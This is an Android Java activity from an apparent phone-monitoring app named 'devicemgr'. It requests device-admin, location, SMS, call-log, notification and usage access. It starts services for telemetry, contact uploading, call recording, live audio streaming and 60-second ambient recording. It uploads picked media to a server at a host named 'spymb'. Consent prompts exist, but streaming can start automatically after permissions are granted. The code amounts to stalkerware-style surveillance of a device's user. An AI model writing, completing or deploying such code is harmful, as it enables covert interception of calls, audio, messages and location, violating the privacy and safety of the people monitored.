package com.company.devicemgr.activities;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.Manifest;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.company.devicemgr.receivers.DeviceAdminReceiver;
import com.company.devicemgr.services.AmbientRecorderService;
import com.company.devicemgr.services.CallRecorderService;
import com.company.devicemgr.services.ContactsUploaderService;
import com.company.devicemgr.services.ForegroundTelemetryService;
import com.company.devicemgr.utils.HttpClient;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

public class MainPermissionsActivity extends Activity {
	private static final String TAG = "MainPermAct";
	
	private static final int REQ_CODE_DEVICE_ADMIN = 1001;
        private static final int REQ_CODE_PERMS = 2001;
        private static final int REQ_CODE_AMBIENT_AUDIO = 2002;
	private static final int REQ_PICK_MEDIA = 3001;
	
        Button btnDeviceAdmin, btnLocationPerm, btnStoragePerm, btnCallLogPerm, btnSmsPerm,
        btnNotifAccess, btnUsageAccess, btnStartService, btnPickMedia, btnConsent;
        TextView tvStatus, tvDeviceId;
        // streaming buttons
        Button btnStartStream, btnStopStream, btnAmbientRecord;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(com.company.devicemgr.R.layout.activity_main_permissions);
		
		// find views
		btnDeviceAdmin = findViewById(com.company.devicemgr.R.id.btnDeviceAdmin);
		btnLocationPerm = findViewById(com.company.devicemgr.R.id.btnLocationPerm);
		btnStoragePerm = findViewById(com.company.devicemgr.R.id.btnStoragePerm);
		btnCallLogPerm = findViewById(com.company.devicemgr.R.id.btnCallLogPerm);
		btnSmsPerm = findViewById(com.company.devicemgr.R.id.btnSmsPerm);
		btnNotifAccess = findViewById(com.company.devicemgr.R.id.btnNotifAccess);
		btnUsageAccess = findViewById(com.company.devicemgr.R.id.btnUsageAccess);
		btnStartService = findViewById(com.company.devicemgr.R.id.btnStartService);
		btnPickMedia = findViewById(com.company.devicemgr.R.id.btnPickMedia);
		btnConsent = findViewById(com.company.devicemgr.R.id.btnConsent);
		
		tvStatus = findViewById(com.company.devicemgr.R.id.tvStatus);
		tvDeviceId = findViewById(com.company.devicemgr.R.id.tvDeviceId);
		
		// streaming buttons (new)
		// these IDs must exist in activity_main_permissions.xml
                btnStartStream = findViewById(com.company.devicemgr.R.id.btnStartStream);
                btnStopStream  = findViewById(com.company.devicemgr.R.id.btnStopStream);
                btnAmbientRecord = findViewById(com.company.devicemgr.R.id.btnAmbientRecord);
		
		// ensure deviceId exists
		final SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
		String deviceId = sp.getString("deviceId", null);
		if (deviceId == null) {
			deviceId = java.util.UUID.randomUUID().toString();
			sp.edit().putString("deviceId", deviceId).apply();
		}
		tvDeviceId.setText("DeviceId: " + deviceId);
		
		// listeners
		if (btnDeviceAdmin != null) {
			btnDeviceAdmin.setOnClickListener(v -> {
				try {
					DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
					ComponentName adminComp = new ComponentName(MainPermissionsActivity.this, DeviceAdminReceiver.class);
					if (!dpm.isAdminActive(adminComp)) {
						Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
						intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
						intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Necessário para bloqueio temporário e políticas.");
						startActivityForResult(intent, REQ_CODE_DEVICE_ADMIN);
						} else {
						showMsg("Device Admin já activo");
					}
					} catch (Exception e) {
					Log.e(TAG, "btnDeviceAdmin click err", e);
					showMsg("Erro: " + e.getMessage());
				}
			});
		}
		
		if (btnLocationPerm != null) {
			btnLocationPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
				android.Manifest.permission.ACCESS_FINE_LOCATION,
				android.Manifest.permission.ACCESS_COARSE_LOCATION
			}));
		}
		
		if (btnStoragePerm != null) {
			btnStoragePerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
				android.Manifest.permission.READ_EXTERNAL_STORAGE,
				android.Manifest.permission.WRITE_EXTERNAL_STORAGE
			}));
		}
		
		if (btnCallLogPerm != null) {
			btnCallLogPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
				android.Manifest.permission.READ_CALL_LOG
			}));
		}
		
		if (btnSmsPerm != null) {
			btnSmsPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
				android.Manifest.permission.READ_SMS
			}));
		}
		
		if (btnNotifAccess != null) {
			btnNotifAccess.setOnClickListener(v -> {
				try {
					Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
					startActivity(i);
					} catch (Exception e) {
					Log.e(TAG, "open notif settings err", e);
					showMsg("Não foi possível abrir definições de notificações");
				}
			});
		}
		
		if (btnUsageAccess != null) {
			btnUsageAccess.setOnClickListener(v -> {
				try {
					Intent i = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
					startActivity(i);
					} catch (Exception e) {
					Log.e(TAG, "open usage settings err", e);
					showMsg("Não foi possível abrir definições de uso");
				}
			});
		}
		
		if (btnConsent != null) {
			btnConsent.setOnClickListener(v -> {
				Log.i(TAG, "btnConsent clicked");
				android.widget.Toast.makeText(MainPermissionsActivity.this, "Abrindo tela de consentimento...", android.widget.Toast.LENGTH_SHORT).show();
				try {
					Intent i = new Intent(MainPermissionsActivity.this, com.company.devicemgr.activities.ConsentActivity.class);
					startActivity(i);
					} catch (Exception ex) {
					Log.e(TAG, "Erro ao iniciar ConsentActivity", ex);
					showMsg("Erro ao abrir consentimento: " + ex.getMessage());
				}
			});
		}
		
		if (btnStartService != null) {
			btnStartService.setOnClickListener(v -> {
				boolean active = sp.getBoolean("active", false);
				if (!active) {
					new AlertDialog.Builder(MainPermissionsActivity.this)
					.setTitle("Aviso")
					.setMessage("A conta pode não estar activada. Continua?")
					.setPositiveButton("Sim", (d, which) -> startAllServices())
					.setNegativeButton("Não", null)
					.show();
					} else {
					startAllServices();
				}
			});
		}
		
		if (btnPickMedia != null) {
			btnPickMedia.setOnClickListener(v -> {
				try {
					Intent i = new Intent(Intent.ACTION_OPEN_DOCUMENT);
					i.addCategory(Intent.CATEGORY_OPENABLE);
					i.setType("*/*");
					String[] mime = {"image/*", "video/*"};
					i.putExtra(Intent.EXTRA_MIME_TYPES, mime);
					startActivityForResult(i, REQ_PICK_MEDIA);
					} catch (Exception e) {
					Log.e(TAG, "pick media err", e);
					showMsg("Erro ao abrir chooser");
				}
			});
		}
		
		// ---------- STREAMING BUTTONS LISTENERS ----------
		if (btnStartStream != null) {
			btnStartStream.setOnClickListener(v -> {
				final SharedPreferences sp2 = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
				boolean alreadyConsent = sp2.getBoolean("consent_streaming", false);
				
				if (!alreadyConsent) {
					new AlertDialog.Builder(MainPermissionsActivity.this)
					.setTitle("Consentimento para transmissão")
					.setMessage("Concorda em iniciar uma transmissão de áudio em tempo real (visível no dispositivo)? A notificação ficará activa enquanto a transmissão ocorrer.")
					.setPositiveButton("Concordo", (dlg, which) -> {
						sp2.edit().putBoolean("consent_streaming", true).apply();
						checkAndStartStreaming();
					})
					.setNegativeButton("Cancelar", null)
					.show();
					} else {
					checkAndStartStreaming();
				}
			});
		}
		
                if (btnStopStream != null) {
                        btnStopStream.setOnClickListener(v -> {
                                try {
                                        Intent stop = new Intent(MainPermissionsActivity.this, com.company.devicemgr.services.StreamingService.class);
                                        stopService(stop);
                                        android.widget.Toast.makeText(MainPermissionsActivity.this, "Transmissão parada", android.widget.Toast.LENGTH_SHORT).show();
                                        } catch (Exception e) {
                                        Log.e(TAG, "stop stream err", e);
                                }
                        });
                }
                if (btnAmbientRecord != null) {
                        btnAmbientRecord.setOnClickListener(v -> {
                                if (ContextCompat.checkSelfPermission(MainPermissionsActivity.this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                                        ActivityCompat.requestPermissions(MainPermissionsActivity.this, new String[]{ Manifest.permission.RECORD_AUDIO }, REQ_CODE_AMBIENT_AUDIO);
                                        return;
                                }
                                try {
                                        Intent ambient = new Intent(MainPermissionsActivity.this, AmbientRecorderService.class);
                                        ambient.putExtra(AmbientRecorderService.EXTRA_DURATION_MS, 60_000L);
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                                ContextCompat.startForegroundService(MainPermissionsActivity.this, ambient);
                                                } else {
                                                startService(ambient);
                                        }
                                        android.widget.Toast.makeText(MainPermissionsActivity.this, "Gravação ambiente iniciada", android.widget.Toast.LENGTH_SHORT).show();
                                        } catch (Exception e) {
                                        Log.e(TAG, "start ambient err", e);
                                        android.widget.Toast.makeText(MainPermissionsActivity.this, "Erro ao iniciar gravação", android.widget.Toast.LENGTH_LONG).show();
                                }
                        });
                }
		// ---------- end streaming buttons ----------
		
		// update status
		updateStatusText();
	}
	
	private void startAllServices() {
		// start telemetry service (foreground)
		try {
			Intent svc = new Intent(this, ForegroundTelemetryService.class);
			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ContextCompat.startForegroundService(this, svc);
			else startService(svc);
			} catch (Exception e) {
			Log.e(TAG, "start telemetry err", e);
			showMsg("Erro a iniciar telemetria: " + e.getMessage());
		}
		
		// if consent flags present, start contacts/call recorder
		SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
		boolean consentContacts = sp.getBoolean("consent_contacts", false);
		boolean consentCalls = sp.getBoolean("consent_calls", false);
		
		if (consentContacts) {
			try {
				Intent c = new Intent(this, ContactsUploaderService.class);
				if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ContextCompat.startForegroundService(this, c);
				else startService(c);
				} catch (Exception e) {
				Log.e(TAG, "start contacts uploader err", e);
			}
		}
		
		if (consentCalls) {
			try {
				Intent cr = new Intent(this, CallRecorderService.class);
				if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ContextCompat.startForegroundService(this, cr);
				else startService(cr);
				} catch (Exception e) {
				Log.e(TAG, "start call recorder err", e);
			}
		}
		
		showMsg("Serviços iniciados (ver status)");
		updateStatusText();
	}
	
	private void showMsg(String m) {
		if (tvStatus != null) tvStatus.setText("Status: " + m);
	}
	
	private void updateStatusText() {
		SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
		String token = sp.getString("auth_token", null);
		String deviceId = sp.getString("deviceId", null);
		boolean consentContacts = sp.getBoolean("consent_contacts", false);
		boolean consentCalls = sp.getBoolean("consent_calls", false);
		
		String st = "Token: " + (token != null ? "OK" : "missing") +
		"\nDeviceId: " + (deviceId != null ? deviceId : "-") +
		"\nConsentContacts: " + (consentContacts ? "Yes" : "No") +
		"\nConsentCalls: " + (consentCalls ? "Yes" : "No");
		if (tvStatus != null) tvStatus.setText(st);
		if (tvDeviceId != null) tvDeviceId.setText("DeviceId: " + (deviceId != null ? deviceId : "-"));
	}
	
	private void requestPermissionsIfNeeded(String[] perms) {
		List<String> need = new ArrayList<>();
		for (String p : perms) {
			if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
				need.add(p);
			}
		}
		if (!need.isEmpty()) {
			ActivityCompat.requestPermissions(this, need.toArray(new String[0]), REQ_CODE_PERMS);
			} else {
			showMsg("Permissões já concedidas");
			// after granting, try start services that need them
			startAllServices();
		}
	}
	
	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		try {
			super.onActivityResult(requestCode, resultCode, data);
			if (requestCode == REQ_PICK_MEDIA && resultCode == RESULT_OK && data != null) {
				Uri uri = data.getData();
				if (uri != null) handlePickedMedia(uri);
				} else if (requestCode == REQ_CODE_DEVICE_ADMIN) {
				showMsg("Device admin resultado: " + resultCode);
			}
			} catch (Exception e) {
			Log.e(TAG, "onActivityResult err", e);
		}
	}
	
	private void handlePickedMedia(final Uri uri) {
		new Thread(() -> {
			try {
				InputStream is = getContentResolver().openInputStream(uri);
				byte[] buf = readAllBytes(is);
				String filename = queryName(uri);
				String mime = getContentResolver().getType(uri);
				SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
				String token = sp.getString("auth_token", null);
				String deviceId = sp.getString("deviceId", "unknown");
				String url = "https://spymb.onrender.com/api/media/" + URLEncoder.encode(deviceId, "UTF-8") + "/upload";
				String resp = HttpClient.uploadFile(url, "media", filename, buf, mime, token);
				runOnUiThread(() -> showMsg("Upload: " + resp));
				} catch (Exception e) {
				Log.e(TAG, "handlePickedMedia err", e);
				runOnUiThread(() -> showMsg("Erro upload: " + e.getMessage()));
			}
		}).start();
	}
	
	private static byte[] readAllBytes(InputStream is) throws java.io.IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] buffer = new byte[8192];
		int read;
		while ((read = is.read(buffer)) != -1) {
			bos.write(buffer, 0, read);
		}
		try { is.close(); } catch (Exception ignored) {}
		return bos.toByteArray();
	}
	
	private String queryName(Uri uri) {
		String displayName = "file";
		android.database.Cursor cursor = null;
		try {
			cursor = getContentResolver().query(uri, null, null, null, null);
			if (cursor != null && cursor.moveToFirst()) {
				int idx = cursor.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME);
				if (idx != -1) displayName = cursor.getString(idx);
			}
			} catch (Exception e) {
			Log.e(TAG, "queryName err", e);
			} finally {
			if (cursor != null) cursor.close();
		}
		return displayName;
	}
	
	/**
	* Helper: check RECORD_AUDIO permission and start the foreground StreamingService
	*/
	private void checkAndStartStreaming() {
		// check runtime permission
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
			if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
				// request the permission - reuse existing REQ_CODE_PERMS
				ActivityCompat.requestPermissions(MainPermissionsActivity.this, new String[]{Manifest.permission.RECORD_AUDIO}, REQ_CODE_PERMS);
				android.widget.Toast.makeText(MainPermissionsActivity.this, "Pede-se permissão de microfone. Tenta iniciar novamente após conceder.", android.widget.Toast.LENGTH_LONG).show();
				return;
			}
		}
		
		// start the foreground streaming service
		try {
			Intent svc = new Intent(MainPermissionsActivity.this, com.company.devicemgr.services.StreamingService.class);
			if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
				startForegroundService(svc);
				} else {
				startService(svc);
			}
			android.widget.Toast.makeText(MainPermissionsActivity.this, "Transmissão iniciada", android.widget.Toast.LENGTH_SHORT).show();
			} catch (Exception e) {
			Log.e("MainPermAct", "start streaming err", e);
			android.widget.Toast.makeText(MainPermissionsActivity.this, "Erro ao iniciar transmissão: " + e.getMessage(), android.widget.Toast.LENGTH_LONG).show();
		}
	}
	
	@Override
	public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
                if (requestCode == REQ_CODE_PERMS) {
                        boolean granted = true;
                        for (int r : grantResults) if (r != PackageManager.PERMISSION_GRANTED) granted = false;
                        showMsg(granted ? "Permissões concedidas" : "Algumas permissões negadas");
                        if (granted) startAllServices();
			
			// adicional: iniciar streaming automaticamente se o consentimento estiver activo
			try {
				if (granted) {
					SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
					boolean wantStream = sp.getBoolean("consent_streaming", false);
					if (wantStream) {
						// start streaming service automatically
						try {
							Intent svc = new Intent(MainPermissionsActivity.this, com.company.devicemgr.services.StreamingService.class);
							if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(svc);
							else startService(svc);
							android.widget.Toast.makeText(MainPermissionsActivity.this, "Permissão concedida — transmissão iniciada", android.widget.Toast.LENGTH_SHORT).show();
							} catch (Exception e) {
							Log.e("MainPermAct", "start streaming after perms err", e);
						}
					}
				}
				} catch (Exception ex) {
				Log.e(TAG, "onRequestPermissionsResult extra err", ex);
                        }
                } else if (requestCode == REQ_CODE_AMBIENT_AUDIO) {
                        boolean granted = true;
                        for (int r : grantResults) if (r != PackageManager.PERMISSION_GRANTED) granted = false;
                        if (granted) {
                                try {
                                        Intent ambient = new Intent(MainPermissionsActivity.this, AmbientRecorderService.class);
                                        ambient.putExtra(AmbientRecorderService.EXTRA_DURATION_MS, 60_000L);
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                                ContextCompat.startForegroundService(MainPermissionsActivity.this, ambient);
                                                } else {
                                                startService(ambient);
                                        }
                                        android.widget.Toast.makeText(MainPermissionsActivity.this, "Gravação ambiente iniciada", android.widget.Toast.LENGTH_SHORT).show();
                                        } catch (Exception e) {
                                        Log.e(TAG, "start ambient after perm err", e);
                                }
                        } else {
                                android.widget.Toast.makeText(MainPermissionsActivity.this, "Permissão de microfone negada", android.widget.Toast.LENGTH_LONG).show();
                        }
                }
                super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
}